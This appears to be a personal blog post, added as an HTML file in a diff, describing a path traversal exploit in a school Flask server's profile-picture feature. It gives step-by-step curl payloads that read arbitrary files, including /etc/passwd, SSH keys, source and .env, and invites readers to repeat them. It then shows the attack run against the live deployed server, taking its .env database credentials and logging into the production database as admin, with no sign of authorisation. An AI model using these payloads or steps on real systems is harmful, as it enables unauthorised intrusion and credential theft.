@@ -1,0 +1,346 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src-attr 'unsafe-inline'">
+
+    <title>Smashing Mort&#x27;s Server for Fun and No Profit 1 | Mataiodoxion</title>
+
+    <link rel="preload" href="https://mataiodoxion.github.io/fonts/FiraCode-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="preload" href="https://mataiodoxion.github.io/fonts/FiraCode-Bold.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://mataiodoxion.github.io/css/style.css?h=287f84ed6c66dca911c6">
+    <link rel="stylesheet" href="https://mataiodoxion.github.io/custom.css?h=d3281feddbb69732b7c5">
+    <script src="https://mataiodoxion.github.io/js/auto-close-popover-on-resize.js?h=4ef87d6fc7b98b22e044" defer></script>
+    <script src="https://mataiodoxion.github.io/js/copy-code-to-clipboard.js?h=b34dc626be3e4c8a0f55" defer></script>
+
+    <link rel="canonical" href="https://mataiodoxion.github.io/blog/smashing-morts-server-1/">
+    
+    <meta name="description" content="Ported from my original blog post hosted on my Jekyll site">
+    <meta name="robots" content="index, follow">
+    <meta name="theme-color" content="#211f1a">
+    <meta name="color-scheme" content="dark">
+
+    <meta property="og:title" content="Smashing Mort's Server for Fun and No Profit 1">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://mataiodoxion.github.io/blog/smashing-morts-server-1/">
+    <meta property="og:description" content="Ported from my original blog post hosted on my Jekyll site">
+    <meta property="og:site_name" content="Mataiodoxion">
+    <meta property="og:updated_time" content="2026-01-09T03:28:11.328026036+00:00">
+    <meta property="article:published_time" content="2025-12-09T00:00:00+00:00">
+
+</head>
+
+<body class="layout-center" data-theme="terminus">
+    <header class="header">
+        <div class="header-container">
+            <span class="header-logo-container">
+                <a href="https://mataiodoxion.github.io">
+                    <span class="logo">Mataiodoxion</span>
+                </a>
+            </span>
+        </div>
+    </header>
+    <main id="main">
+        <article class="post content">
+            <header>
+                <h1 class="post-title">
+                    <a href="https://mataiodoxion.github.io/blog/smashing-morts-server-1/">Smashing Mort&#x27;s Server for Fun and No Profit 1</a>
+                </h1>
+                <ul class="post-meta hidden">
+                    <li title="Published on 2025-12-09"><time datetime="2025-12-09">2025.12.09</time></li>
+                    <li role="separator" aria-hidden="true">::</li>
+                    <li title="841 words"><time datetime="PT5M">5 min</time> read</li>
+                </ul>
+            </header>
+
+<p>Basically, Mr. Mort's template flask server hosts an option for managing user's PFPs. I was able to find a <strong>path traversal vulnerability</strong> in the server which allows me to read any file I want on the host computer (including <code>/etc/passwd</code> which I used for this writeup) which effectively gives me full read access to any system this server is hosted on :D. And all you need is a regular user account.</p>
+<h2 id="the-setup">The Setup<a class="post-anchor" href="#the-setup" aria-label="Anchor link for: the-setup"><span aria-hidden="true">#</span></a>
+</h2>
+<p>The Flask server has a profile picture feature. Users can upload a profile picture, and it gets stored in their own directory under <code>instance/uploads/{user_id}/</code>. The code looks something like this:</p>
+<pre data-lang="py" data-name="model/pfp.py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py" data-name="model/pfp.py"><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">pfp_base64_decode</span><span>(</span><span style="color:#bf616a;">user_id</span><span>, </span><span style="color:#bf616a;">user_pfp</span><span>):
+</span><span>    img_path = os.path.</span><span style="color:#bf616a;">join</span><span>(app.config[&quot;</span><span style="color:#a3be8c;">UPLOAD_FOLDER</span><span>&quot;], user_id, user_pfp)
+</span><span>    </span><span style="color:#b48ead;">try</span><span>:
+</span><span>        </span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span>(img_path, &quot;</span><span style="color:#a3be8c;">rb</span><span>&quot;) </span><span style="color:#b48ead;">as </span><span>img_file:
+</span><span>            base64_encoded = base64.</span><span style="color:#bf616a;">b64encode</span><span>(img_file.</span><span style="color:#bf616a;">read</span><span>()).</span><span style="color:#bf616a;">decode</span><span>(&quot;</span><span style="color:#a3be8c;">utf-8</span><span>&quot;)
+</span><span>        </span><span style="color:#b48ead;">return </span><span>base64_encoded
+</span><span>    </span><span style="color:#b48ead;">except </span><span>Exception </span><span style="color:#b48ead;">as </span><span>e:
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">An error occurred while reading the profile picture: </span><span>{</span><span style="color:#bf616a;">str</span><span>(e)}&quot;)
+</span><span>        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">None
+</span></code></pre>
+<p>At first glance, this seems fine. Each user has their own directory, filenames are stored in the database, and only authenticated users can access their pictures. All fine and dandy.</p>
+<p>My suspicion at the time was that <code>os.path.join()</code> can probably be used to do things it probably shouldn't (like joining <code>../</code>):</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>&gt;&gt;&gt; </span><span style="color:#b48ead;">import </span><span>os
+</span><span>&gt;&gt;&gt; os.path.</span><span style="color:#bf616a;">join</span><span>(&#39;</span><span style="color:#a3be8c;">/uploads</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">user123</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">../../../etc/passwd</span><span>&#39;)
+</span><span>&#39;</span><span style="color:#a3be8c;">/uploads/user123/../../../etc/passwd</span><span>&#39;
+</span></code></pre>
+<p>That path would resolve to <code>/etc/passwd</code> and thus I'd be able to access it. Now there's two vulnerable points: <code>user_id</code> and <code>user_pfp</code>. I decided to go with the latter.</p>
+<h2 id="tracing-the-attack-surface">Tracing the Attack Surface<a class="post-anchor" href="#tracing-the-attack-surface" aria-label="Anchor link for: tracing-the-attack-surface"><span aria-hidden="true">#</span></a>
+</h2>
+<p>Looking at the API endpoint that retrieves the profile pictures:</p>
+<pre data-lang="py" data-name="api/pfp.py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py" data-name="api/pfp.py"><span>@</span><span style="color:#bf616a;">token_required</span><span>()
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">get</span><span>(</span><span style="color:#bf616a;">self</span><span>):
+</span><span>    current_user = g.current_user
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">if </span><span>current_user.pfp:
+</span><span>        base64_encode = </span><span style="color:#bf616a;">pfp_base64_decode</span><span>(current_user.uid, current_user.pfp)
+</span><span>        </span><span style="color:#b48ead;">if </span><span>not base64_encode:
+</span><span>            </span><span style="color:#b48ead;">return </span><span>{&#39;</span><span style="color:#a3be8c;">message</span><span>&#39;: &#39;</span><span style="color:#a3be8c;">An error occurred while reading the profile picture.</span><span>&#39;}, </span><span style="color:#d08770;">500
+</span><span>        </span><span style="color:#b48ead;">return </span><span>{&#39;</span><span style="color:#a3be8c;">pfp</span><span>&#39;: base64_encode}, </span><span style="color:#d08770;">200
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        </span><span style="color:#b48ead;">return </span><span>{&#39;</span><span style="color:#a3be8c;">message</span><span>&#39;: &#39;</span><span style="color:#a3be8c;">Profile picture is not set.</span><span>&#39;}, </span><span style="color:#d08770;">404
+</span></code></pre>
+<p>It's immediately clear that <code>curent_user</code> comes from the database. Question is, can I control what gets stored in the database?</p>
+<p>Unforunately, I found out that the upload endpoint uses <code>secure_filename()</code>:</p>
+<pre data-lang="py" data-name="model/pfp.py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py" data-name="model/pfp.py"><span style="color:#b48ead;">try</span><span>:
+</span><span>    image_data = base64.</span><span style="color:#bf616a;">b64decode</span><span>(base64_image)
+</span><span>    filename = </span><span style="color:#bf616a;">secure_filename</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{user_uid}</span><span style="color:#a3be8c;">.png</span><span>&quot;)
+</span><span>    user_dir = os.path.</span><span style="color:#bf616a;">join</span><span>(app.config[&quot;</span><span style="color:#a3be8c;">UPLOAD_FOLDER</span><span>&quot;], user_uid)
+</span><span>    </span><span style="color:#b48ead;">if </span><span>not os.path.</span><span style="color:#bf616a;">exists</span><span>(user_dir):
+</span><span>        os.</span><span style="color:#bf616a;">makedirs</span><span>(user_dir)
+</span><span>    file_path = os.path.</span><span style="color:#bf616a;">join</span><span>(user_dir, filename)
+</span><span>    </span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span>(file_path, &quot;</span><span style="color:#a3be8c;">wb</span><span>&quot;) </span><span style="color:#b48ead;">as </span><span>img_file:
+</span><span>        img_file.</span><span style="color:#bf616a;">write</span><span>(image_data)
+</span><span>    </span><span style="color:#b48ead;">return </span><span>filename
+</span></code></pre>
+<p>Alas, the endpoint is secure after all. The filename always used <code>{user_uid}.png</code> and it's sanitized with <code>secure_filename()</code>. Dead end? Luckily no!</p>
+<h2 id="finding-the-bypass">Finding the Bypass<a class="post-anchor" href="#finding-the-bypass" aria-label="Anchor link for: finding-the-bypass"><span aria-hidden="true">#</span></a>
+</h2>
+<p>Then I found the user <em>update</em> endpoint.</p>
+<pre data-lang="py" data-name="api/user.py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py" data-name="api/user.py"><span style="color:#65737e;"># Accounts are desired to be GitHub accounts, change must be validated 
+</span><span style="color:#b48ead;">if </span><span>body.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">uid</span><span>&#39;) and body.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">uid</span><span>&#39;) != user._uid:
+</span><span>    </span><span style="color:#bf616a;">_</span><span>, status = </span><span style="color:#bf616a;">GitHubUser</span><span>().</span><span style="color:#bf616a;">get</span><span>(body.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">uid</span><span>&#39;))
+</span><span>    </span><span style="color:#b48ead;">if </span><span>status != </span><span style="color:#d08770;">200</span><span>:
+</span><span>        </span><span style="color:#b48ead;">return </span><span>{&#39;</span><span style="color:#a3be8c;">message</span><span>&#39;: </span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">User ID </span><span>{body.</span><span style="color:#bf616a;">get</span><span>(&quot;</span><span style="color:#a3be8c;">uid</span><span>&quot;)}</span><span style="color:#a3be8c;"> not a valid GitHub account</span><span>&#39; }, </span><span style="color:#d08770;">404
+</span><span>
+</span><span style="color:#65737e;"># Update the User object to the database using custom update method
+</span><span>user.</span><span style="color:#bf616a;">update</span><span>(body)
+</span><span>
+</span><span style="color:#65737e;"># return response, the updated user details as a JSON object
+</span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">jsonify</span><span>(user.</span><span style="color:#bf616a;">read</span><span>())
+</span></code></pre>
+<p>This endpoint accepts any field from the request body and passes it to <code>user.update()</code>. What about the <code>pfp</code> field?</p>
+<pre data-lang="py" data-name="model/user.py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py" data-name="model/user.py"><span>@pfp.</span><span style="color:#bf616a;">setter
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">pfp</span><span>(</span><span style="color:#bf616a;">self</span><span>, </span><span style="color:#bf616a;">pfp</span><span>):
+</span><span>    </span><span style="color:#bf616a;">self</span><span>._pfp = pfp
+</span></code></pre>
+<p>Yikes. The setter has no validation at all. I can set <code>pfp</code> to anything I want through the user update API actually.</p>
+<h2 id="an-exploit">An Exploit<a class="post-anchor" href="#an-exploit" aria-label="Anchor link for: an-exploit"><span aria-hidden="true">#</span></a>
+</h2>
+<p>I'll first try performing this proof of concept locally. We'll first start by setting my pfp to a path traversal payload.</p>
+<p>Let's say I put a file called <code>secret.txt</code> in my own home directory:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">/home/username/secret.txt
+</span></code></pre>
+<p>Now let's set our path traversal payload to that directory:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">~</span><span> curl</span><span style="color:#bf616a;"> -X</span><span> PUT http://localhost:8001/api/user \
+</span><span style="color:#bf616a;">  -H </span><span>&quot;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&quot; \
+</span><span style="color:#bf616a;">  -b</span><span> cookies.txt \
+</span><span style="color:#bf616a;">  -d </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;pfp&quot;: &quot;../../../../../../../secret.txt&quot;}</span><span>&#39;
+</span></code></pre>
+<p>We have 7 <code>../</code> because that's how deep I store the <code>flask</code> repo locally. This is done relative from <code>flask/instance/uploads/toby/</code>.</p>
+<p>Our response:</p>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>{
+</span><span>  &quot;</span><span style="color:#a3be8c;">ap_exam</span><span>&quot;: {},
+</span><span>  &quot;</span><span style="color:#a3be8c;">class</span><span>&quot;: [],
+</span><span>  &quot;</span><span style="color:#a3be8c;">email</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">?</span><span>&quot;,
+</span><span>  &quot;</span><span style="color:#a3be8c;">grade_data</span><span>&quot;: {},
+</span><span>  &quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">1</span><span>,
+</span><span>  &quot;</span><span style="color:#a3be8c;">kasm_server_needed</span><span>&quot;: </span><span style="color:#d08770;">true</span><span>,
+</span><span>  &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Thomas Edison</span><span>&quot;,
+</span><span>  &quot;</span><span style="color:#a3be8c;">password</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">pbkdf2:sha256:1000000$5nmqG27dxK$ef0b2a220d9ada9655c29e88800f6a8c4ebbcade6ad45cb0480a233847601f5c</span><span>&quot;,
+</span><span>  &quot;</span><span style="color:#a3be8c;">pfp</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">../../../../../../../secret.txt</span><span>&quot;,
+</span><span>  &quot;</span><span style="color:#a3be8c;">role</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Admin</span><span>&quot;,
+</span><span>  &quot;</span><span style="color:#a3be8c;">school</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Unknown</span><span>&quot;,
+</span><span>  &quot;</span><span style="color:#a3be8c;">sections</span><span>&quot;: [
+</span><span>    {
+</span><span>      &quot;</span><span style="color:#a3be8c;">abbreviation</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">CSA</span><span>&quot;,
+</span><span>      &quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">1</span><span>,
+</span><span>      &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Computer Science A</span><span>&quot;,
+</span><span>      &quot;</span><span style="color:#a3be8c;">year</span><span>&quot;: </span><span style="color:#d08770;">2026
+</span><span>    },
+</span><span>    {
+</span><span>      &quot;</span><span style="color:#a3be8c;">abbreviation</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">CSP</span><span>&quot;,
+</span><span>      &quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">2</span><span>,
+</span><span>      &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Computer Science Principles</span><span>&quot;,
+</span><span>      &quot;</span><span style="color:#a3be8c;">year</span><span>&quot;: </span><span style="color:#d08770;">2026
+</span><span>    }
+</span><span>  ],
+</span><span>  &quot;</span><span style="color:#a3be8c;">sid</span><span>&quot;: </span><span style="color:#d08770;">null</span><span>,
+</span><span>  &quot;</span><span style="color:#a3be8c;">uid</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">toby</span><span>&quot;
+</span><span>}
+</span></code></pre>
+<p>Notice that the <code>pfp</code> field is in fact what we set. Now we'll run a simple <code>GET</code> request to actually read it:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">~</span><span> curl</span><span style="color:#bf616a;"> -X</span><span> GET http://localhost:8001/api/id/pfp</span><span style="color:#bf616a;"> -b</span><span> cookies.txt
+</span></code></pre>
+<p>And huzza:</p>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>{
+</span><span>  &quot;</span><span style="color:#a3be8c;">pfp</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">cGxlYXNlIHNwZWVkIEkgbmVlZCB0aGlzIAoKZG9uJ3QgcmVhZCBtZSBwbHMKCm15IHNlcnZlciBpcyBraW5kIG9mIHZ1bG5lcmFibGUKCkkndmUgYmVlbiB3YXRjaGluZyB5b3VyIHN0cmVhbS4geW91ciBrZXkgaXM6IEJMRUhISEhICg==</span><span>&quot;
+</span><span>}
+</span></code></pre>
+<p>Ok, but that's in base64 because we're using it for image encoding. No problem, just decode it:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">~</span><span> echo &quot;</span><span style="color:#a3be8c;">cGxlYXNlIHNwZWVkIEkgbmVlZCB0aGlzIAoKZG9uJ3QgcmVhZCBtZSBwbHMKCm15IHNlcnZlciBpcyBraW5kIG9mIHZ1bG5lcmFibGUKCkkndmUgYmVlbiB3YXRjaGluZyB5b3VyIHN0cmVhbS4geW91ciBrZXkgaXM6IEJMRUhISEhICg==</span><span>&quot; | </span><span style="color:#bf616a;">base64 -d
+</span></code></pre>
+<p>And get our <code>secret.txt</code> text:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>please speed I need this
+</span><span>
+</span><span>don&#39;t read me pls
+</span><span>
+</span><span>my server is kind of vulnerable
+</span><span>
+</span><span>I&#39;ve been watching your stream. your key is: BLEHHHHH
+</span></code></pre>
+<p>It works! If you're skeptical, you can try it yourself too, just</p>
+<ol>
+<li>Authenticate your user and store the cookie</li>
+<li><code>POST</code> to edit your pfp with some relative path (at <code>/api/user</code>)</li>
+<li><code>GET</code> your pfp (at <code>/api/id/pfp</code>)</li>
+</ol>
+<h2 id="escalating">Escalating<a class="post-anchor" href="#escalating" aria-label="Anchor link for: escalating"><span aria-hidden="true">#</span></a>
+</h2>
+<p>There's a lot you could do with this. You could grab <code>/etc/passwd</code>, <code>/home/.ssh/id_ed25519</code> (if correct perms), etc.. I could also access source code:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">~</span><span> curl</span><span style="color:#bf616a;"> -X</span><span> PUT http://localhost:8001/api/user \
+</span><span style="color:#bf616a;">  -b</span><span> cookies.txt \
+</span><span style="color:#bf616a;">  -d </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;pfp&quot;: &quot;../../../__init__.py&quot;}</span><span>&#39;
+</span></code></pre>
+<p>and database files (which contain password hashes):</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">~</span><span> curl</span><span style="color:#bf616a;"> -X</span><span> PUT http://localhost:8001/api/user \
+</span><span style="color:#bf616a;">  -b</span><span> cookies.txt \
+</span><span style="color:#bf616a;">  -d </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;pfp&quot;: &quot;../../volumes/user_management.db&quot;}</span><span>&#39;
+</span></code></pre>
+<p>I could also grab <code>.env</code>.</p>
+<h2 id="that-s-not-in-prod">That's Not in Prod<a class="post-anchor" href="#that-s-not-in-prod" aria-label="Anchor link for: that-s-not-in-prod"><span aria-hidden="true">#</span></a>
+</h2>
+<p>If you're asking, can I do this right now to Mr. Mort's deployed <code>flask.opencodingsociety.com</code>? The answer is no... but I do have some ideas. I've tried quite a few times to get this path traversal working against the actual Amazon EC2 Docker instance, but it wasn't working. For example, let's try grabbing another user's profile picture through this traversal (because if you take a look at the <code>docker-compose.yml</code>, <code>instance</code> is mounted). Usually, I get this response:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">~</span><span> curl</span><span style="color:#bf616a;"> -X</span><span> PUT https://flask.opencodingsociety.com/api/user \
+</span><span style="color:#bf616a;">-H </span><span>&quot;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&quot; \
+</span><span style="color:#bf616a;">-b</span><span> cookies.txt \
+</span><span style="color:#bf616a;">-d </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;pfp&quot;: &quot;../niko/niko.png&quot;}</span><span>&#39;
+</span><span style="color:#bf616a;">{</span><span>&quot;</span><span style="color:#a3be8c;">...</span><span>&quot;</span><span style="color:#bf616a;">, </span><span>&quot;</span><span style="color:#a3be8c;">pfp</span><span>&quot;:&quot;</span><span style="color:#a3be8c;">../niko/niko.png</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">...</span><span>&quot;}
+</span></code></pre>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">~</span><span> curl</span><span style="color:#bf616a;"> -X</span><span> GET https://flask.opencodingsociety.com/api/id/pfp</span><span style="color:#bf616a;"> -b</span><span> cookies.txt
+</span><span style="color:#bf616a;">{</span><span>&quot;</span><span style="color:#a3be8c;">message</span><span>&quot;</span><span style="color:#bf616a;">: </span><span>&quot;</span><span style="color:#a3be8c;">An error occurred while reading the profile picture.</span><span>&quot;}
+</span></code></pre>
+<p>Funnily enough, the reason why this exploit doesn't work against the deployed server is simply because the profile picture feature has not been implemented (correctly). That's literally it. When you make that web request to set your profile picture, supposedly this is appended to a user's upload folder, but since the actual code doesn't create these folders, you can't navigate out of a nonexistent folder.</p>
+<p>... Which is what I thought before I researched the function a little more.</p>
+<p>If we take a look back at the original base64 decode function:</p>
+<pre data-lang="py" data-name="model/pfp.py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py" data-name="model/pfp.py"><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">pfp_base64_decode</span><span>(</span><span style="color:#bf616a;">user_id</span><span>, </span><span style="color:#bf616a;">user_pfp</span><span>):
+</span><span>    img_path = os.path.</span><span style="color:#bf616a;">join</span><span>(app.config[&#39;</span><span style="color:#a3be8c;">UPLOAD_FOLDER</span><span>&#39;], user_id, user_pfp)
+</span><span>    </span><span style="color:#65737e;"># ...
+</span></code></pre>
+<p>I noticed that the code happens to run a path join on wherever the uploads folder is located, your <code>user_id</code>, and the image path you give it <code>user_pfp</code>. The constant <code>UPLOAD_FOLDER</code> is defined here:</p>
+<pre data-lang="py" data-name="__init__.py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py" data-name="__init__.py"><span>app.config[&#39;</span><span style="color:#a3be8c;">UPLOAD_FOLDER</span><span>&#39;] = os.path.</span><span style="color:#bf616a;">join</span><span>(app.instance_path, &#39;</span><span style="color:#a3be8c;">uploads</span><span>&#39;)
+</span></code></pre>
+<p>After my fiddling with the Docker container, I figured out that this would be located under <code>/app/instance/uploads</code>.</p>
+<p>So, for example, if I wanted to upload a photo <code>meow.png</code> as my profile picture, the path would look like:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>&gt;&gt;&gt; os.path.</span><span style="color:#bf616a;">join</span><span>(&#39;</span><span style="color:#a3be8c;">/app/instance/uploads</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">mataiodoxion</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">meow.png</span><span>&#39;)
+</span><span>&#39;</span><span style="color:#a3be8c;">/app/instance/uploads/mataiodoxion/meow.png</span><span>&#39;
+</span></code></pre>
+<p>However, taking a look at the docs for <code>os.path.join()</code>, we find that</p>
+<blockquote>
+<p>If a segment is an absolute path (which on Windows requires both a drive and a root), then all previous segments are ignored and joining continues from the absolute path segment. On Linux, for example:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>&gt;&gt;&gt; os.path.</span><span style="color:#bf616a;">join</span><span>(&#39;</span><span style="color:#a3be8c;">/home/foo</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">bar</span><span>&#39;)
+</span><span>&#39;</span><span style="color:#a3be8c;">/home/foo/bar</span><span>&#39;
+</span><span>&gt;&gt;&gt; os.path.</span><span style="color:#bf616a;">join</span><span>(&#39;</span><span style="color:#a3be8c;">/home/foo</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">/home/bar</span><span>&#39;)
+</span><span>&#39;</span><span style="color:#a3be8c;">/home/bar</span><span>&#39;
+</span></code></pre>
+<p>— <cite>Os.Path Python Docs<sup class="footnote-reference"><a href="#1">1</a></sup></cite></p>
+</blockquote>
+<p>Great! So now that we know absolute paths work and we know where <code>.env</code> is stored, let's just grab it:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">~</span><span> curl</span><span style="color:#bf616a;"> -X</span><span> PUT https://flask.opencodingsociety.com/api/user \
+</span><span style="color:#bf616a;">-H </span><span>&quot;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&quot; \
+</span><span style="color:#bf616a;">-b</span><span> cookie.txt \
+</span><span style="color:#bf616a;">-d </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;pfp&quot;: &quot;/app/.env&quot;}</span><span>&#39;   
+</span><span style="color:#bf616a;">{</span><span>&quot;</span><span style="color:#a3be8c;">...</span><span>&quot;</span><span style="color:#bf616a;">, </span><span>&quot;</span><span style="color:#a3be8c;">pfp</span><span>&quot;:&quot;</span><span style="color:#a3be8c;">/app/.env</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">uid</span><span>&quot;:&quot;</span><span style="color:#a3be8c;">mataiodoxion</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">...</span><span>&quot;}
+</span><span>
+</span><span style="color:#bf616a;">~</span><span> curl</span><span style="color:#bf616a;"> -X</span><span> GET https://flask.opencodingsociety.com/api/id/pfp \
+</span><span style="color:#bf616a;">-H </span><span>&quot;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&quot; \
+</span><span style="color:#bf616a;">-b</span><span> cookie.txt
+</span><span style="color:#bf616a;">{</span><span>&quot;</span><span style="color:#a3be8c;">pfp</span><span>&quot;</span><span style="color:#bf616a;">: </span><span>&quot;</span><span style="color:#a3be8c;">&lt;base64&gt;</span><span>&quot;}
+</span><span>
+</span><span style="color:#bf616a;">~</span><span> echo &quot;</span><span style="color:#a3be8c;">&lt;base64&gt;</span><span>&quot; | </span><span style="color:#bf616a;">base64 -d
+</span><span style="color:#65737e;"># ...
+</span><span style="color:#65737e;"># Database configuration
+</span><span style="color:#bf616a;">DB_ENDPOINT</span><span>=&#39;</span><span style="color:#a3be8c;">...</span><span>&#39;
+</span><span style="color:#bf616a;">DB_USERNAME</span><span>=&#39;</span><span style="color:#a3be8c;">admin</span><span>&#39;
+</span><span style="color:#bf616a;">DB_PASSWORD</span><span>=&#39;</span><span style="color:#a3be8c;">...</span><span>&#39;
+</span><span style="color:#65737e;"># ...
+</span></code></pre>
+<p>Now that we have that info, let's log in to the DB.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>~ mysql -u admin -h &lt;DB-ENDPOINT&gt; -p --ssl-ca=global-bundle.pem
+</span><span>Enter password: 
+</span><span>Welcome to the MariaDB monitor.  Commands end with ; or \g.
+</span><span>Your MySQL connection id is 35579
+</span><span>Server version: 8.0.42 Source distribution
+</span><span>
+</span><span>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span><span>
+</span><span>Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+</span><span>
+</span><span>MySQL [(none)]&gt; STATUS;
+</span><span>--------------
+</span><span>mysql from 12.1.2-MariaDB, client 15.2 for Linux (x86_64) using readline 5.1
+</span><span>
+</span><span>Connection id:		35579
+</span><span>Current database:	
+</span><span>Current user:		admin@&lt;IP_ADDRESS&gt;
+</span><span>SSL:			Cipher in use is TLS_AES_256_GCM_SHA384, cert is OK
+</span><span>Current pager:		more
+</span><span>Using outfile:		&#39;&#39;
+</span><span>Using delimiter:	;
+</span><span>Server:			MySQL
+</span><span>Server version:		8.0.42 Source distribution
+</span><span>Protocol version:	10
+</span><span>Connection:		&lt;DB_ENDPOINT&gt; via TCP/IP
+</span><span>Server characterset:	utf8mb4
+</span><span>Db     characterset:	utf8mb4
+</span><span>Client characterset:	utf8mb4
+</span><span>Conn.  characterset:	utf8mb4
+</span><span>TCP port:		3306
+</span><span>Uptime:			57 days 9 hours 46 min 10 sec
+</span><span>
+</span><span>Threads: 13  Questions: 6329493  Slow queries: 0  Opens: 606  Flush tables: 3  Open tables: 418  Queries per second avg: 1.276
+</span><span>--------------
+</span><span>
+</span><span>MySQL [(none)]&gt; SHOW DATABASES;
+</span><span>+--------------------+
+</span><span>| Database           |
+</span><span>+--------------------+
+</span><span>| information_schema |
+</span><span>| mysql              |
+</span><span>| performance_schema |
+</span><span>| sys                |
+</span><span>| user_management    |
+</span><span>+--------------------+
+</span><span>5 rows in set (0.036 sec)
+</span><span>
+</span><span>MySQL [(none)]&gt; exit
